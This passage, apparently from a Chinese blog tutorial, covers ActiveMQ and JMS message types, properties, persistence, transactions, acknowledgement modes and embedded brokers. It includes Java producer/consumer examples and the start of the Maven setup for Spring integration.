&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Message - 消息体&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;理解：封装具体的消息数据&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;五种消息格式&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210115232313.png&quot; alt=&quot;image-20210115232313263&quot;/&gt;&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;注意：发送和接收的消息体类型必须一致对应&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;消息生产者&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;for (int i = 0; i &amp;lt; 3; i++) {
        // 发送TextMessage消息体
        TextMessage textMessage = session.createTextMessage(&quot;topic &quot; + i);
        producer.send(textMessage);

        // 发送MapMessage 消息体。set方法添加，get方式获取
        MapMessage mapMessage = session.createMapMessage();
        mapMessage.setString(&quot;name&quot;,&quot;rose&quot; + i);
        mapMessage.setInt(&quot;age&quot;, 18 + i);
        producer.send(mapMessage);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;消息消费者&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public void onMessage(Message message) {
    if(null != message &amp;amp;&amp;amp; message instanceof TextMessage) {
         TextMessage textMessage = (TextMessage) message;
         try {
             System.out.println(&quot;====&amp;gt; 消费者接受到text消息：&quot; + textMessage.getText());
         } catch (JMSException e) {
              e.printStackTrace();
         }
     }

     if(null != message &amp;amp;&amp;amp; message instanceof MapMessage) {
          MapMessage mapMessage = (MapMessage) message;
          try {
               System.out.println(&quot;====&amp;gt; 消费者接受到map消息：&quot; + mapMessage.getString(&quot;name&quot;));
               System.out.println(&quot;====&amp;gt; 消费者接受到map消息：&quot; + mapMessage.getString(&quot;age&quot;));
           } catch (JMSException e) {
               e.printStackTrace();
           }
      }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Message - 消息属性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果需要除消息头字段之外的值那么可以使用消息属性。它是 &lt;span&gt;识别 / 去重 / 重点标注&lt;/span&gt; 等操作非常有用的方法。&lt;/p&gt;
&lt;p&gt;它们是以属性名和属性值对的形式制定的。可以将属性是为消息头得扩展，属性指定一些消息头没有包括的附加信息，比如可以在属性里指定消息选择器。消息的属性就像可以分配给一条消息的附加消息头一样。它们允许开发者添加有关消息的不透明附加信息。它们还用于暴露消息选择器在消息过滤时使用的数据。&lt;/p&gt;
&lt;p&gt;下图是设置消息属性的API：&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210115233623.png&quot; alt=&quot;image-20210115233623890&quot;/&gt;&lt;p&gt;生产者&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;for (int i = 0; i &amp;lt; 3; i++) {
        TextMessage textMessage = session.createTextMessage(&quot;topic &quot; + i);

        // 调用Message的set*Property()方法就能设置消息属性
        // 根据value的数据类型的不同，有相应的API
        textMessage.setStringProperty(&quot;From&quot;,&quot;rose@qq.com&quot;);
        textMessage.setByteProperty(&quot;Spec&quot;, (byte) 1);
        textMessage.setBooleanProperty(&quot;Invalide&quot;,true);

        producer.send(textMessage);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;消费者&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public void onMessage(Message message) {
        if(null != message &amp;amp;&amp;amp; message instanceof TextMessage) {
                TextMessage textMessage = (TextMessage) message;
                try {
                        System.out.println(&quot;消息体：&quot; + textMessage.getText());
                        System.out.println(&quot;消息属性：&quot; + textMessage.getStringProperty(&quot;From&quot;));
                        System.out.println(&quot;消息属性：&quot; + textMessage.getByteProperty(&quot;Spec&quot;));
                        System.out.println(&quot;消息属性：&quot; + textMessage.getBooleanProperty(&quot;Invalide&quot;));
                } catch (JMSException e) {
                        e.printStackTrace();
                }
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;35-jms的可靠性&quot;&gt;3.5 JMS的可靠性&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;RERSISTENT - 持久性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;什么是持久化消息 =&amp;gt; 保证消息只被传送一次和成功使用一次。在持久性消息传送至目标时，消息服务将其放入持久性数据存储。如果消息服务由于某种原因导致失败，它可以恢复此消息并将此消息传送至相应的消费者,虽然这样增加了消息传送的开销但却增加了可靠性。&lt;/p&gt;
&lt;p&gt;我的理解：在消息生产者将消息成功发送给MQ消息中间件之后。无论是出现任何问题如：MQ服务器宕机、消费者掉线等。都保证（topic要之前注册过，queue不用）消息消费者能够成功消费消息。如果消息生产者发送消息就失败了，那么消费者也不会消费到该消息。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210115235300.png&quot; alt=&quot;image-20210115235300769&quot;/&gt;&lt;ol&gt;&lt;li&gt;Queue消息非持久和持久&lt;/li&gt;
&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;Queue非持久，当服务器宕机消息不存在（消息丢失了）。&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;注意：只要服务器没有宕机，即便是非持久，消费者不在线的话消息也不会丢失，等待消费者在线还是能够收到消息的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;//非持久化的消费者和之前的代码一样。下面演示非持久化的生产者。

// 非持久化
producer.setDeliveryMode(DeliveryMode.NON_PERSISTENT);
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;Queue持久化，当服务器宕机消息依然存在。&lt;span&gt;Queue消息默认是持久化的。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;持久化消息，保证这些消息只被传送一次和成功使用一次。对于这些消息可靠性是优先考虑的因素。可靠性的另一个重要方面是确保持久性消息传送至目标后，消息服务在向消费者传送它们之前不会丢失这些消息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;//持久化的消费者和之前的代码一样。下面演示持久化的生产者。

//持久化
producer.setDeliveryMode(DeliveryMode.PERSISTENT);
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;Topic消息非持久和持久&lt;/li&gt;
&lt;/ol&gt;&lt;ul readability=&quot;0&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;Topic非持久，&lt;span&gt;Topic默认就是非持久化的&lt;/span&gt;，因为生产者生产消息时消费者也要在线，这样消费者才能消费到消息。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;Topic消息持久化，只要消费者向MQ服务器注册过，所有生产者发布成功的消息该消费者都能收到，不管是MQ服务器宕机还是消费者不在线。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;//持久化topic生产者代码

// 设置持久化topic 
producer.setDeliveryMode(DeliveryMode.PERSISTENT);
// 设置持久化topic之后再启动连接
conn.start();
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;//持久化topic消费者代码

public static void main(String[] args) throws Exception{
    ActiveMQConnectionFactory activeMQConnectionFactory = new ActiveMQConnectionFactory(ACTIVEMQ_URL);
    Connection conn = activeMQConnectionFactory.createConnection();
    
        // 设置客户端ID,向MQ服务器注册自己的名称
    conn.setClientID(&quot;marrry&quot;);
    
    Session session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);
    Topic topic = session.createTopic(TOPIC_NAME);
    
        // 创建一个topic订阅者对象。一参是topic，二参是订阅者名称
    TopicSubscriber topicSubscriber = session.createDurableSubscriber(topic,&quot;remark...&quot;);
    // 之后再开启连接
    connection.start();
    
    //之前是消息的消费者，这里就改为主题的订阅者
    Message message = topicSubscriber.receive();
    while (null != message){
        TextMessage textMessage = (TextMessage)message;
        System.out.println(&quot; 收到的持久化 topic：&quot; + textMessage.getText());
        message = topicSubscriber.receive(2000L);//继续监听2s,从激活到离线
        //经测试：离线再激活后仍然能收到之前的消息
    }
    
    session.close();
    conn.close();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210116000703.png&quot; alt=&quot;image-20210116000703132&quot;/&gt;&lt;blockquote&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;ol readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;一定要先运行一次消费者，等于向MQ注册，类似我订阅了这个主题。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;然后再运行生产者发送消息。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;之后无论消费者是否在线都会收到消息。如果不在线的话，下次连接的时候会把没有收过的消息都接收过来。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Transaction - 事务&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;生产者开启事务后，执行commit方法这批消息才真正的被提交。不执行commit方法这批消息不会提交。执行rollback方法之前的消息会回滚掉。&lt;span&gt;生产者的事务机制要高于签收机制，&lt;/span&gt;当生产者开启事务后签收机制不再重要。&lt;/p&gt;
&lt;p&gt;消费者开启事务后，执行commit方法这批消息才算真正的被消费。不执行commit方法这些消息不会标记已消费，下次还会被消费。执行rollback方法不能回滚之前执行过的业务逻辑，但是能够回滚之前的消息，回滚后的消息下次还会被消费。消费者利用commit和rollback方法，&lt;span&gt;甚至能够违反一个消费者只能消费一次消息的原理。&lt;/span&gt;&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210116004820.png&quot; alt=&quot;image-20210116004820189&quot;/&gt;&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;注意：消费者和生产者需要同时操作事务才行吗？ =&amp;gt; 消费者和生产者的事务完全没有关联，各自是各自的事务。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class JmsProduce {
    public static final String ACTIVEMQ_URL = &quot;tcp://mpolaris.top:61616&quot;;
    public static final String TOPIC_NAME = &quot;topic_01&quot;;

    public static void main(String[] args) throws JMSException {
        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(ACTIVEMQ_URL);
        Connection conn = factory.createConnection();
        conn.start();

        //1.创建会话session，两个参数transacted=事务,acknowledgeMode=确认模式(签收)
        //设置为开启事务
        Session session = conn.createSession(true, Session.AUTO_ACKNOWLEDGE);

        Topic topic = session.createTopic(TOPIC_NAME);
        MessageProducer producer = session.createProducer(topic);

        try {
            for (int i = 0; i &amp;lt; 3; i++) {
                TextMessage textMessage = session.createTextMessage(&quot;topic &quot; + i);
                producer.send(textMessage);
//                if(i == 2) {
//                    throw new RuntimeException(&quot;=====&amp;gt; GG&quot;);
//                }
            }

            // 2. 开启事务后，使用commit提交事务，这样这批消息才能真正的被提交。
            session.commit();

            System.out.println(&quot;====&amp;gt; 消息发布到MQ完成&quot;);
        } catch (JMSException e) {
            System.out.println(&quot;出现异常,消息回滚&quot;);

            // 3. 工作中一般当代码出错我们在catch代码块中回滚。这样这批发送的消息就能回滚。
            session.rollback();

        } finally {
            producer.close();
            session.close();
            conn.close();
        }
    }
}

//如果有一条抛出异常，则回滚
//Exception in thread &quot;main&quot; java.lang.RuntimeException: =====&amp;gt; GG
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class JmsConsumer {
    public static final String ACTIVEMQ_URL = &quot;tcp://mpolaris.top:61616&quot;;
    public static final String TOPIC_NAME = &quot;topic_01&quot;;

    public static void main(String[] args) throws Exception {
        System.out.println(&quot;=====&amp;gt; 1号消费者&quot;);

        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(ACTIVEMQ_URL);
        Connection conn = factory.createConnection();
        conn.start();

        // 创建会话session，两个参数transacted=事务,acknowledgeMode=确认模式(签收)
        // 消费者开启了事务就必须手动提交，不然会重复消费消息
        final Session session = conn.createSession(true, Session.AUTO_ACKNOWLEDGE);

        Topic topic = session.createTopic(TOPIC_NAME);
        MessageConsumer consumer = session.createConsumer(topic);
        consumer.setMessageListener(new MessageListener() {
            int a = 0;
            @Override
            public void onMessage(Message message) {
                if(null != message &amp;amp;&amp;amp; message instanceof TextMessage) {
                    TextMessage textMessage = (TextMessage) message;
                    try {
                        System.out.println(&quot;消息体：&quot; + textMessage.getText());
                        if(a == 0){
                            System.out.println(&quot;commit&quot;);
                            session.commit();
                        }
                        if (a == 2) {
                            System.out.println(&quot;rollback&quot;);
                            session.rollback();
                        }
                        a++;
                    } catch (JMSException e) {
                        System.out.println(&quot;出现异常，消费失败，放弃消费&quot;);
                        try {
                            session.rollback();
                        } catch (JMSException ex) {
                            ex.printStackTrace();
                        }
                    }
                }
            }
        });
        System.in.read();
        consumer.close();
        session.close();
        conn.close();
    }
}

// 不执行commit方法的1和2消息不会标记已消费，下次还会被消费
// 执行rollback方法不能回滚之前执行过的业务逻辑，但是能够回滚之前的消息，回滚后的消息下次还会被消费

// =====&amp;gt; 1号消费者
// 消息体：topic 0
// commit
// 消息体：topic 1
// 消息体：topic 2
// rollback
// 消息体：topic 1
// 消息体：topic 2
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Acknowledge - 签收&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;签收的几种方式&lt;/p&gt;
&lt;ul readability=&quot;3.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;自动签收（Session.AUTO_ACKNOWLEDGE）：该方式是默认的，该种方式无需我们程序做任何操作，框架会帮我们自动签收收到的消息。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;手动签收（Session.CLIENT_ACKNOWLEDGE）：手动签收，该种方式需要我们手动调用Message.acknowledge()来签收消息。如果不签收消息该消息会被我们反复消费直到被签收。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;允许重复消息（Session.DUPS_OK_ACKNOWLEDGE）：多线程或多个消费者同时消费到一个消息，因为线程不安全可能会重复消费。该种方式很少使用到。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;事务下的签收（Session.SESSION_TRANSACTED）：开启事务的情况下可以使用该方式，该种方式很少使用到。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;事务和签收的关系&lt;/p&gt;
&lt;ul readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;在事务性会话中，当一个事务被成功提交则消息被自动签收。如果事务回滚则消息会被再次传送。事务优先于签收，开始事务后签收机制不再起任何作用。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;非事务性会话中，消息何时被确认取决于创建会话时的应答模式。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;生产者事务开启，只有commit后才能将全部消息变为已消费。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;span&gt;事务偏向生产者，签收偏向消费者。&lt;/span&gt;也就是说生产者使用事务更好点，消费者使用签收机制更好点。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;非事务下的消费者如何使用手动签收的方式&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;非事务下的生产者跟之前的代码一样&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class JmsProduce {
    public static final String ACTIVEMQ_URL = &quot;tcp://mpolaris.top:61616&quot;;
    public static final String QUEUE_NAME = &quot;queue_01&quot;;

    public static void main(String[] args) throws JMSException {
        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(ACTIVEMQ_URL);
        Connection conn = factory.createConnection();
        conn.start();
        Session session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);
        Queue queue = session.createQueue(QUEUE_NAME);
        MessageProducer producer = session.createProducer(queue);
        for (int i = 0; i &amp;lt; 3; i++) {
            TextMessage textMessage = session.createTextMessage(&quot;msg -&amp;gt; &quot; + i);
            producer.send(textMessage);
        }
        producer.close();
        session.close();
        conn.close();

        System.out.println(&quot;====&amp;gt; 消息发布到MQ完成&quot;);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;非事务下的消费者如何手动签收&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class JmsConsumer {
    public static final String ACTIVEMQ_URL = &quot;tcp://mpolaris.top:61616&quot;;
    public static final String QUEUE_NAME = &quot;queue_01&quot;;

    public static void main(String[] args) throws JMSException {
        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory(ACTIVEMQ_URL);
        Connection conn = factory.createConnection();
        conn.start();
        //这里改为Session.CLIENT_ACKNOWLEDGE
        Session session = conn.createSession(false, Session.CLIENT_ACKNOWLEDGE);
        Queue queue = session.createQueue(QUEUE_NAME);

        MessageConsumer consumer = session.createConsumer(queue);
        while (true) {
            TextMessage message = (TextMessage) consumer.receive(4000L);
            if (null != message) {
                System.out.println(&quot;====&amp;gt; 消费者的消息：&quot; + message.getText());
                
                //设置为Session.CLIENT_ACKNOWLEDGE后，要调用该方法，标志着该消息已被签收（消费）。
                //如果不调用该方法，该消息的标志还是未消费，下次启动消费者或其他消费者还会收到改消息。
                message.acknowledge();
            } else {
                break;
            }
        }

        consumer.close();
        session.close();
        conn.close();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;注意：JMS保证可靠有四种方式，除了上面讲到的持久性，事务，签收，还可以通过多节点集群的方式来保证可靠性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&quot;36-jms的点对点总结&quot;&gt;3.6 JMS的点对点总结&lt;/h5&gt;
&lt;p&gt;点对点模型是基于队列的，生产者发消息到队列，消费者从队列接收消息，队列的存在使得消息的异步传输成为可能，和我们平时给朋友发送短信类似。&lt;/p&gt;
&lt;p&gt;如果在Session关闭时有部分消息己被收到但还没有被签收(acknowledged)，那当消费者下次连接到相同的队列时，这些消息还会被再次接收。&lt;/p&gt;
&lt;p&gt;队列可以长久地保存消息直到消费者收到消息，消费者不需要因为担心消息会丢失而时刻和队列保持激活的连接状态，充分体现了异步传输模式的优势。&lt;/p&gt;
&lt;h5 id=&quot;37-jms的发布订阅总结&quot;&gt;3.7 JMS的发布订阅总结&lt;/h5&gt;
&lt;p&gt;&lt;strong&gt;JMS的发布订阅总结&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;JMS Pub/Sub 模型定义了如何向一个内容节点发布和订阅消息，这些节点被称作Topic。&lt;/p&gt;
&lt;p&gt;主题可以被认为是消息的传输中介，发布者（publisher）发布消息到主题，订阅者（subscribe）从主题订阅消息。&lt;/p&gt;
&lt;p&gt;主题使得消息订阅者和消息发布者保持互相独立，不需要解除即可保证消息的传送。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;非持久订阅&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;非持久订阅只有当客户端处于激活状态，也就是和MQ保持连接状态才能收发到某个主题的消息。&lt;/p&gt;
&lt;p&gt;如果消费者处于离线状态，生产者发送的主题消息将会丢失作废，消费者永远不会收到。一句话：先订阅注册才能接受到发布，只给订阅者发布消息。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;持久订阅&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;客户端首先向MQ注册一个自己的身份ID识别号，当这个客户端处于离线时，生产者会为这个ID保存所有发送到主题的消息，当客户再次连接到MQ的时候，会根据消费者的ID得到所有当自己处于离线时发送到主题的消息。&lt;/p&gt;
&lt;p&gt;当非持久订阅状态下，不能恢复或重新派送一个未签收的消息。持久订阅才能恢复或重新派送一个未签收的消息。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;非持久和持久化订阅如何选择&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当所有的消息必须被接收则用持久化订阅，当消息丢失能够被容忍则用非持久订阅。&lt;/p&gt;
&lt;h4 id=&quot;4-activemq的broker&quot;&gt;4. ActiveMQ的Broker&lt;/h4&gt;
&lt;h5 id=&quot;41-broker是什么&quot;&gt;4.1 broker是什么&lt;/h5&gt;
&lt;p&gt;相当于 &lt;span&gt;一个ActiveMQ服务器实例&lt;/span&gt;。说白了Broker其实就是实现了用代码的形式启动ActiveMQ将MQ嵌入到Java代码中，以便随时用随时启动，在用的时候再去启动这样能节省了资源，也保证了可用性。这种方式，我们实际开发中很少采用，因为他缺少太多了东西，如：日志，数据存储等等。&lt;/p&gt;
&lt;h5 id=&quot;42-启动broker时指定配置文件&quot;&gt;4.2 启动broker时指定配置文件&lt;/h5&gt;
&lt;p&gt;启动broker时指定配置文件，可以帮助我们在一台服务器上启动多个broker。实际工作中一般一台服务器只启动一个broker。&lt;/p&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210116022208.png&quot; alt=&quot;image-20210116022208482&quot;/&gt;&lt;h5 id=&quot;43-嵌入式的broker启动&quot;&gt;4.3 嵌入式的broker启动&lt;/h5&gt;
&lt;p&gt;用ActiveMQ Broker作为独立的消息服务器来构建Java应用。&lt;/p&gt;
&lt;p&gt;ActiveMQ也支持在vm中通信基于嵌入的broker，能够无缝的集成其他java应用。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;下面演示如何启动嵌入式的broker&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;pom.xml添加一个依赖&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;com.fasterxml.jackson.core&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;jackson-databind&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;2.10.1&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;嵌入式broker的启动类&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;import org.apache.activemq.broker.BrokerService;

public class EmbedBroker {
    public static void main(String[] args) throws Exception {
        //ActiveMQ也支持在vm中通信基于嵌入的broker
        BrokerService brokerService = new BrokerService();
        brokerService.setPopulateJMSXUserID(true);
        brokerService.addConnector(&quot;tcp://127.0.0.1:61616&quot;);
        brokerService.start();
   }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210116022845.png&quot; alt=&quot;image-20210116022845378&quot;/&gt;&lt;img src=&quot;https://gitee.com/mp2333/blog-img/raw/master/ActiveMQ/20210116022903.png&quot; alt=&quot;image-20210116022903297&quot;/&gt;&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class JmsProduce {
    public static final String ACTIVEMQ_URL = &quot;tcp://localhost:61616&quot;;
    public static final String QUEUE_NAME = &quot;queue_01&quot;;
        ...
        
        
public class JmsConsumer {
    public static final String ACTIVEMQ_URL = &quot;tcp://localhost:61616&quot;;
    public static final String QUEUE_NAME = &quot;queue_01&quot;;
    ...
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;5-spring整合activemq&quot;&gt;5. Spring整合ActiveMQ&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;理解&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们之前介绍的内容也很重要，它更灵活，支持各种自定义功能，可以满足我们工作中复杂的需求。&lt;/p&gt;
&lt;p&gt;很多activemq的功能要看官方文档或者博客，这些功能大多是在上面代码的基础上修改完善的。如果非要把这些功能强行整合到spring，就有些缘木求鱼了。而另一种方式整合spring更好，就是将上面的类注入到Spring中，其他不变。这样既能保持原生的代码，又能集成到spring。&lt;/p&gt;
&lt;p&gt;下面我们讲的Spring和SpringBoot整合ActiveMQ也重要，它给我们提供了一个模板，简化了代码，减少我们工作中遇到坑，能够满足开发中90%以上的功能。&lt;/p&gt;
&lt;p&gt;**pom.xml添加依赖 **&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;dependencies&amp;gt;
        &amp;lt;!--  ActiveMQ 所需要的jar包--&amp;gt;
        &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.apache.activemq&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;activemq-all&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;5.15.9&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;
        &amp;lt;!--  ActiveMQ 和 Spring 整合的基础包 --&amp;gt;
        &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.apache.xbean&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;xbean-spring&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;3.16&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;
        &amp;lt;!-- 嵌入式ActiveMQ --&amp;gt;
        &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;com.fasterxml.jackson.core&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;jackson-databind&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;2.10.1&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;

        &amp;lt;!-- Spring对JMS的支持，整合Spring和ActiveMQ --&amp;gt;
        &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.springframework&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;spring-jms&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;5.2.1.RELEASE&amp;lt;/version&amp;gt;
                &amp;lt;/dependency&amp;gt;
        &amp;lt;!-- ActiveMQ连接池 --&amp;gt;
        &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.apache.activemq&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;activemq-pool&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;5.15.10&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;

        &amp;lt;!-- Spring核心依赖 --&amp;gt;
        &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.springframework&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;spring-core&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;4.3.23.RELEASE&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;
        &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.springframework&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;spring-context&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;4.3.23.RELEASE&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;
        &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.springframework&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;spring-aop&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;4.3.23.RELEASE&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;
        &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.springframework&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;spring-orm&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;4.3.23.RELEASE&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;

        &amp;lt;!-- junit/log4j等基础配置   --&amp;gt;
        &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;org.slf4j&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;slf4j-api&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;1.7.25&amp;lt;/version&amp;gt;
        &amp;lt;/dependency&amp;gt;
        &amp;lt;dependency&amp;gt;
                &amp;lt;groupId&amp;gt;junit&amp;lt;/groupId&amp;gt;
                &amp;lt;artifactId&amp;gt;junit&amp;lt;/artifactId&amp;gt;
                &amp;lt;version&amp;gt;4.12&amp;lt;/version&amp;gt;
                &amp;lt;scope&amp;gt;test&amp;lt;/scope&amp;gt;
        &amp;lt;/dependency&amp;gt;
&amp;lt;/dependencies&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Spring的ActiveMQ配置文件&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;src/main/resources/spring-activemq.cml&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
